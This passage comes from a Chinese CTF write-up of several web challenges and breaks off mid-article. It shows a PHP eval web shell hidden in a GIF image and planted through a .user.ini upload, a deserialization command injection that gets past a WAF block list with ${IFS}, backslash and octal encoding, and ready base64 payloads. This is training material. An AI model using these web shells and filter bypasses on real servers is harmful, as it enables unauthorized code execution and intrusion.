GET、_POST、$_COOKIE的所有内容，是它们的集合体。也就内是说只要用其中一种方容式做一个表单，把cmd这个变量给POST或者GET，甚至用cookies就可以把传输上去的内容执行。简而言之吧，就是执行cmd的值。</p></li><li><p><strong>蚁剑的工作原理：首先你需要发现服务端的一句话木马，每次连接的密码其实就是一句话木马的名字，蚁剑会帮你执行各种代码以获取完整的服务器目录。</strong></p></li><li><p>**==利用.user.ini的条件==**：</p><p>**服务器脚本语言为PHP **</p><p>**服务器使用CGI **</p><p>**FastCGI模式 **</p><p><strong>上传目录下要有可执行的php文件</strong></p></li><li><p>**==图片头文件GIF89a==**：</p><p>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年发行），但在<strong>Web上所见到的大多数图形都是以89a版的格式创建的</strong>。 89a版的一个最主要的优势就是<strong>可以创建动态图像</strong>，特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。</p></li><li><p><strong>关于在Content-Type中multipart/form-data的解析：</strong></p><p><strong>boundary是表示分隔，用于分隔多个文件。格式是：–后面跟着一串随机数</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryNolPbAiXBmFZAw6W<br><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br>//提交为文件<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name="fileUpload"; filename=".user.ini"<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream<br>//这里的content-type是文件类型，浏览器自己判断<br>GIF89a<br>auto_prepend_file=b.jpg<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name="upload"<br>æäº¤<br>------WebKitFormBoundaryNolPbAiXBmFZAw6W--<br><br>//提交为表单字段<br>------WebKitFormBoundaryxHKqg3ljAsuAFWBO<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name="note"<br>字段内容<br>------WebKitFormBoundaryxHKqg3ljAsuAFWBO<br></code></pre></td></tr></table></figure></li></ul><h5 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h5><p>首先试一下能不能访问<code>index.phps</code>，<code>flag.php</code>，好吧，都没用。题目的意思一个是想让我们上传一张图片。我们先上传其他的类型的文件试试：</p><p>上传.txt文件回显：<code>your filetype looks wicked</code>（你的文件是恶意的），说明大部分的文件格式被过滤</p><p>上传图片文件回显：<code>file upload successful, the path is:  uploads/2051259.jpg</code></p><p>可以知道文件上传后是存放在uploads/文件夹里</p><p><strong>我们需要明确一点，文件上传的解题是需要我们上传可执行文件，从而控制服务端</strong></p><p><strong>所以我们这里使用.user.ini配置文件来让index.php文件包含一个webshell，所以我们先创建一个包含shell语句的图片马b.txt</strong></p><p>内容如下：之后修改文件后缀为.gif，直接上传即可，因为图片文件未被过滤</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br>&lt;?=eval($_REQUEST<span class="hljs-section">['cmd']</span>)<span class="hljs-comment">;?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_6.jpg" class=""><p><strong>之后想办法上传.user.ini文件，但会被过滤，所以我们使用BP抓包，修改上传文件的类型<code>application/octet-stream</code>为<code>image/gif</code>,</strong></p><p>创建一个.user.ini文件，其内容如下：auto_prepend_file是指当前目录下的任意php文件都要包含=之后的文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br><span class="hljs-attr">auto_prepend_file</span>=b.gif<br></code></pre></td></tr></table></figure><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_5.jpg" class=""><p>上传成功，未被过滤</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_7.jpg" class=""><p>下面我们使用蚁剑连接服务器：</p><p>首先查看地址，是要在<code>/uploads</code>目录下</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_4.jpg" class=""><p>连接成功，可能会连接不上，多上传几次</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_2.jpg" class=""><p>在根目录下发现flag</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_3.jpg" class=""><p>答案：cyberpeace{9f37b587e6875ce35380526dba1120c6}</p><h4 id="8-unseping-江苏工匠杯（过滤的绕过）"><a href="#8-unseping-江苏工匠杯（过滤的绕过）" class="headerlink" title="8_unseping 江苏工匠杯（过滤的绕过）"></a>8_unseping 江苏工匠杯（过滤的绕过）</h4><h5 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h5><p>进去就是一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>{<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    }<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">"ping"</span>))) {<br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$this</span>-&gt;method), <span class="hljs-variable language_">$this</span>-&gt;args);<br>        }<br>    } <br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>{<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    }<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">"/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/"</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$pat_array</span>)) {<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"don't hack"</span>;<br>        }<br>    }<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) {<br>            <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<br>        }<br>    }   <br>}<br><span class="hljs-variable">$ctf</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'ctf'</span>];<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ctf</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p><strong>PHP序列化和反序列化</strong>：</p><p><strong>序列化</strong>（串行化）：是将变量转换为可保存或传输的字符串的过程；</p><p><strong>反序列化</strong>（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p><p>常见的php序列化和反序列化方式主要有：serialize，unserialize；json_encode，json_decode。</p></li><li><p>反序列化中常见的魔术函数：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__construct</span>() 当一个对象创建时被调用，反序列化不触发<br><span class="hljs-built_in">__destruct</span>()  当一个对象销毁时被调用<br><span class="hljs-built_in">__toString</span>()  当一个对象被当作一个字符串使用，比如echo输出或用 . 和字符串拼接<br><span class="hljs-built_in">__call</span>()      当调用的方法不存在时触发<br><span class="hljs-built_in">__invoke</span>()    当一个对象被当作函数调用时触发<br><span class="hljs-built_in">__wakeup</span>()    反序列化时自动调用<br><span class="hljs-built_in">__sleep</span>()     执行<span class="hljs-built_in">serialize</span>()时，先会调用这个函数<br><span class="hljs-built_in">__get</span>()       类中的属性私有或不存在触发<br><span class="hljs-built_in">__set</span>()       类中的属性私有或不存在触发<br></code></pre></td></tr></table></figure></li><li><p>PHP函数：</p><ul><li>call_user_func_array：把第一个参数作为回调函数进行调用，第二个参数传入数组，将数组中的值作为回调函数的参数</li><li>exec：用来执行一个外部程序，不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面</li><li>passthru：只调用命令，把命令的运行结果原样地直接输出到标准输出设备上</li><li>system：输出并返回最后一行shell结果</li></ul></li><li><p><strong>==shell语句被过滤的一些绕过技巧：==</strong></p><p><strong>空格被过滤：</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt; 、&lt;&gt;、%09(tab键)、%20、$IFS$9、$IFS$1、${IFS}、$IFS等，还可以用{} 比如 {cat,flag}<br></code></pre></td></tr></table></figure><p><strong>敏感字符被过滤：</strong></p><p>字符串转为8进制</p></li><li><p>linux中的**<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="28.397ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 12551.4 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(1444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">可</text></g><g data-mml-node="mi" transform="translate(2444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">以</text></g><g data-mml-node="mi" transform="translate(3444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">用</text></g><g data-mml-node="mi" transform="translate(4444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">于</text></g><g data-mml-node="mi" transform="translate(5444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">执</text></g><g data-mml-node="mi" transform="translate(6444.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">行</text></g><g data-mml-node="mi" transform="translate(7444.4,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(7913.4,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(8489.4,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(8955.4,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(9253.4,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(9551.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">命</text></g><g data-mml-node="mi" transform="translate(10551.4,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">令</text></g><g data-mml-node="mi" transform="translate(11551.4,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">：</text></g></g></g></svg></mjx-container>(shell)</p></li><li><h5 id="linux中的printf函数支持字符串的8进制表示的读入-：使用printf-“hello-world”"><a href="#linux中的printf函数支持字符串的8进制表示的读入-：使用printf-“hello-world”" class="headerlink" title="==linux中的printf函数支持字符串的8进制表示的读入==：使用printf “hello world”"></a>==linux中的<code>printf</code>函数支持字符串的8进制表示的读入==：使用printf “hello world”</h5></li></ul><h5 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h5><p>​        这是一个很明显的反序列化题。首先可以明确的是我们需要传入一个POST变量ctf，其反序列化生成的对象时，会首先调用construct函数构造一个对象，然后调用__wakeup函数，其调用了waf，去检测<code>args</code>里是否有敏感字符<code>cat|flag|tac|php|ls</code>，这里说明args应该是一个数组，先记下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) {<br>    <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<span class="hljs-comment">//检测敏感字符</span><br>}<br></code></pre></td></tr></table></figure><p>然后代码结束，调用__destruct函数，发现这是在查看上传的method是否在数组ping中，如果有，则调用<code>call_user_func_array</code>，将<code>array($this, $this-&gt;method)</code>作为函数，<code>this-&gt;args</code>作为函数参数，很显然，我们应该去调用ping函数，<strong>里面有exec函数，这个函数可以使用系统命令，我们可以查看当前服务器下的一些东西</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>{<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>}<br></code></pre></td></tr></table></figure><p><strong>那么上传变量的产生方式应为：在PHP代码里生成序列化，然后base64-encode。</strong></p><p>比如我们想要查看index.php同级目录下的文件，</p><p>我们可以在PHP中这样写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'ls'</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//但是我们想起来之前有一段对输入数组的过滤，其中就有ls，那么我们应该写为</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'l\s'</span>));<span class="hljs-comment">//使用反写杠绕过过滤</span><br><br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozOiJsXHMiO319</span><br></code></pre></td></tr></table></figure><p><strong>注意用POST参数传入</strong></p><p>那么我得到回显：<code>array(2) { [0]=&gt; string(12) "flag_1s_here" [1]=&gt; string(9) "index.php" }</code></p><p>说明index.php同级目录下还有一个<code>flag_1s_here</code>文件，没有后缀的话，可能时目录，编写shell，继续执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'l\s${IFS}-l${IFS}fl\ag_1s_here'</span>));<span class="hljs-comment">//注意flag和空格也被过滤掉，分别用反斜杠和${IFS}绕过</span><br>    <br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozMDoibFxzJHtJRlN9LWwke0lGU31mbFxhZ18xc19oZXJlIjt9fQ==</span><br></code></pre></td></tr></table></figure><p>回显：<code>array(2) { [0]=&gt; string(7) "total 4" [1]=&gt; string(64) "-rwxr-xr-x 1 root root 53 Nov 9 13:21 flag_831b69012c67b35f.php" }</code></p><p>flag应该就在<code>flag_831b69012c67b35f.php</code>里了</p><p><strong>因为<code>/</code>被过滤掉了，所以将字符串转为8进制，正常的字符串应该这样写</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'$(printf${IFS}"cat /flag_1s_here/flag_831b69012c67b35f.php")'</span>));<br></code></pre></td></tr></table></figure><p>那么转为8进制则为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">'ping'</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'$(printf${IFS}"\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160")'</span>));<br><br><span class="hljs-comment">//执行得到</span><br><span class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjk6IiQocHJpbnRmJHtJRlN9IlwxNDNcMTQxXDE2NFw0MFwxNDZcMTU0XDE0MVwxNDdcMTM3XDYxXDE2M1wxMzdcMTUwXDE0NVwxNjJcMTQ1XDU3XDE0NlwxNTRcMTQxXDE0N1wxMzdcNzBcNjNcNjFcMTQyXDY2XDcxXDYwXDYxXDYyXDE0M1w2Nlw2N1wxNDJcNjNcNjVcMTQ2XDU2XDE2MFwxNTBcMTYwIikiO319</span><br></code></pre></td></tr></table></figure><p>最后访问即可得到flag：<code>cyberpeace{48a58397b3c434b2436426a5c3479d12}</code></p><h4 id="9-upload1"><a href="#9-upload1" class="headerlink" title="9_upload1"></a>9_upload1</h4><h5 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h5><p>文件上传题，检查网页源码，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">contains</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">obj</span>) {  </span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>;  </span><br><span class="language-javascript">    <span class="hljs-keyword">while</span> (i--) {  </span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>[i] === obj) {  </span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  </span><br><span class="language-javascript">        }</span><br><span class="language-javascript">    }</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  </span><br><span class="language-javascript">}</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>){</span><br><span class="language-javascript">upfile = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"upfile"</span>);</span><br><span class="language-javascript">submit = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"submit"</span>);</span><br><span class="language-javascript">name = upfile.<span class="hljs-property">value</span>;</span><br><span class="language-javascript">ext = name.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^.+\./</span>,<span class="hljs-string">''</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">if</span>([<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>].<span class="hljs-title function_">contains</span>(ext)){</span><br><span class="language-javascript">submit.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">}<span class="hljs-keyword">else</span>{</span><br><span class="language-javascript">submit.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">'请选择一张图片文件上传!'</span>);</span><br><span class="language-javascript">}</span><br><span class="language-javascript">}</span><br></code></pre></td></tr></table></figure><h5 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h5><ul><li>本题JS绕过：修改上传文件后缀</li></ul><h5 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h5><p>文件上传题，想办法上传webshell，很明显前端有一个JS过滤，有两种办法，一种是在网页元素里删除JS后上传，另一种是上传图片🐎，我这里选择上传图片🐎。</p><p>编写一个图片🐎b.jpg：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 